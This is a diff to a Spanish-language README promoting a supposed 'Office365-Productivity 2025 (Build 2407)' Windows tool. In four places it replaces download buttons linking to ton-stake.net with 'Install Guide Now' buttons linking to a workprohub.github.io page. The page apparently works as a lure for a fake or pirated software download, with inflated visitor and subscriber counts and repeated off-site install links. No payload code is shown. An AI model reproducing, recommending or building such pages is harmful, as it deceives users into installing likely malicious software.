@@ -6,7 +6,10 @@
 
 **Descripción**: Mejore su productividad con **Office365-Productivity 2025 (Build 2407)**, una herramienta para Windows! Cree documentos, gestione tareas y optimice su trabajo. ¡Únase a 67K+ visitantes y 43K+ suscriptores para consejos en 2025!
 
-[![Empezar Ahora](https://img.shields.io/badge/Empezar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://workprohub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -34,7 +37,10 @@ Comience con **Office365-Productivity 2025** para mejorar su trabajo en Windows 
 6. **Solución de Problemas** ❓  
    ¿Problemas? Verifique la compatibilidad del sistema, actualice los controladores o visite nuestro foro comunitario para soporte.
 
-[![Empezar Ahora](https://img.shields.io/badge/Empezar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://workprohub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -47,7 +53,10 @@ Comience con **Office365-Productivity 2025** para mejorar su trabajo en Windows 
 - 🌍 **Comunidad Activa**: Apoyada por 67K+ visitantes y 43K+ suscriptores que comparten consejos.  
 - 📅 **Actualizaciones 2025**: Actualizado regularmente para nuevas funciones.
 
-[![Empezar Ahora](https://img.shields.io/badge/Empezar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://workprohub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -65,7 +74,10 @@ Comience con **Office365-Productivity 2025** para mejorar su trabajo en Windows 
 - 🛠 **Edición de Datos**: Analice datos con Excel o PowerPoint.  
 - 📚 **Consejos Comunitarios**: Aprenda de las estrategias de los 43K+ suscriptores.
 
-[![Empezar Ahora](https://img.shields.io/badge/Empezar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://workprohub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
